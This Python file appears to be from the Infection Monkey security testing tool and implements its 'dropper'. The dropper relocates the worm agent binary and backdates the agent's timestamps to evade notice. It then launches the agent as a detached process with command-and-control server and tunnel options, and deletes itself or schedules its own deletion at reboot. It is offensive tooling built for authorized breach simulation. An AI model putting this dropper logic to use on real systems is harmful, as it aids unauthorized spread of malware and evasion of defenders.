import argparse
import ctypes
import filecmp
import logging
import os
import pprint
import shutil
import subprocess
import sys
import time
from ctypes import c_char_p

from common.utils.attack_utils import ScanStatus, UsageEnum
from infection_monkey.config import WormConfiguration
from infection_monkey.telemetry.attack.t1106_telem import T1106Telem
from infection_monkey.utils.commands import (
    build_monkey_commandline_explicitly,
    get_monkey_commandline_linux,
    get_monkey_commandline_windows,
)
from infection_monkey.utils.environment import is_windows_os

if "win32" == sys.platform:
    from win32process import DETACHED_PROCESS
else:
    DETACHED_PROCESS = 0

# Linux doesn't have WindowsError
try:
    WindowsError
except NameError:
    # noinspection PyShadowingBuiltins
    WindowsError = IOError


logger = logging.getLogger(__name__)

MOVEFILE_DELAY_UNTIL_REBOOT = 4


class MonkeyDrops(object):
    def __init__(self, args):
        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument("-p", "--parent")
        arg_parser.add_argument("-t", "--tunnel")
        arg_parser.add_argument("-s", "--server")
        arg_parser.add_argument("-d", "--depth", type=int)
        arg_parser.add_argument("-l", "--location")
        arg_parser.add_argument("-vp", "--vulnerable-port")
        self.monkey_args = args[1:]
        self.opts, _ = arg_parser.parse_known_args(args)

        self._config = {
            "source_path": os.path.abspath(sys.argv[0]),
            "destination_path": self.opts.location,
        }

        logger.debug("Dropper is running with config:\n%s", pprint.pformat(self._config))

    def start(self):
        if self._config["destination_path"] is None:
            logger.error("No destination path specified")
            return False

        # we copy/move only in case path is different
        try:
            file_moved = filecmp.cmp(self._config["source_path"], self._config["destination_path"])
        except OSError:
            file_moved = False

        if not file_moved and os.path.exists(self._config["destination_path"]):
            os.remove(self._config["destination_path"])

        # always try to move the file first
        if not file_moved:
            try:
                shutil.move(self._config["source_path"], self._config["destination_path"])

                logger.info(
                    "Moved source file '%s' into '%s'",
                    self._config["source_path"],
                    self._config["destination_path"],
                )

                file_moved = True
            except (WindowsError, IOError, OSError) as exc:
                logger.debug(
                    "Error moving source file '%s' into '%s': %s",
                    self._config["source_path"],
                    self._config["destination_path"],
                    exc,
                )

        # if file still need to change path, copy it
        if not file_moved:
            try:
                shutil.copy(self._config["source_path"], self._config["destination_path"])

                logger.info(
                    "Copied source file '%s' into '%s'",
                    self._config["source_path"],
                    self._config["destination_path"],
                )
            except (WindowsError, IOError, OSError) as exc:
                logger.error(
                    "Error copying source file '%s' into '%s': %s",
                    self._config["source_path"],
                    self._config["destination_path"],
                    exc,
                )

                return False

        if WormConfiguration.dropper_set_date:
            if sys.platform == "win32":
                dropper_date_reference_path = os.path.expandvars(
                    WormConfiguration.dropper_date_reference_path_windows
                )
            else:
                dropper_date_reference_path = WormConfiguration.dropper_date_reference_path_linux
            try:
                ref_stat = os.stat(dropper_date_reference_path)
            except OSError:
                logger.warning(
                    "Cannot set reference date using '%s', file not found",
                    dropper_date_reference_path,
                )
            else:
                try:
                    os.utime(
                        self._config["destination_path"], (ref_stat.st_atime, ref_stat.st_mtime)
                    )
                except OSError:
                    logger.warning("Cannot set reference date to destination file")

        monkey_options = build_monkey_commandline_explicitly(
            parent=self.opts.parent,
            tunnel=self.opts.tunnel,
            server=self.opts.server,
            depth=self.opts.depth,
            location=None,
        )

        if is_windows_os():
            monkey_commandline = get_monkey_commandline_windows(
                self._config["destination_path"], monkey_options
            )

            monkey_process = subprocess.Popen(
                monkey_commandline,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True,
                creationflags=DETACHED_PROCESS,
            )
        else:
            dest_path = self._config["destination_path"]
            # In Linux, we need to change the directory first, which is done
            # using thw `cwd` argument in `subprocess.Popen` below

            monkey_commandline = get_monkey_commandline_linux(dest_path, monkey_options)

            monkey_process = subprocess.Popen(
                monkey_commandline,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True,
                cwd="/".join(dest_path.split("/")[0:-1]),
                creationflags=DETACHED_PROCESS,
            )

        logger.info(
            "Executed monkey process (PID=%d) with command line: %s",
            monkey_process.pid,
            " ".join(monkey_commandline),
        )

        time.sleep(3)
        if monkey_process.poll() is not None:
            logger.warning("Seems like monkey died too soon")

    def cleanup(self):
        logger.info("Cleaning up the dropper")

        try:
            if self._config["source_path"].lower() != self._config[
                "destination_path"
            ].lower() and os.path.exists(self._config["source_path"]):

                # try removing the file first
                try:
                    os.remove(self._config["source_path"])
                except Exception as exc:
                    logger.debug(
                        "Error removing source file '%s': %s", self._config["source_path"], exc
                    )

                    # mark the file for removal on next boot
                    dropper_source_path_ctypes = c_char_p(self._config["source_path"].encode())
                    if 0 == ctypes.windll.kernel32.MoveFileExA(
                        dropper_source_path_ctypes, None, MOVEFILE_DELAY_UNTIL_REBOOT
                    ):
                        logger.debug(
                            "Error marking source file '%s' for deletion on next boot (error "
                            "%d)",
                            self._config["source_path"],
                            ctypes.windll.kernel32.GetLastError(),
                        )
                    else:
                        logger.debug(
                            "Dropper source file '%s' is marked for deletion on next boot",
                            self._config["source_path"],
                        )
                        T1106Telem(ScanStatus.USED, UsageEnum.DROPPER_WINAPI).send()

            logger.info("Dropper cleanup complete")
        except AttributeError:
            logger.error("Invalid configuration options. Failing")
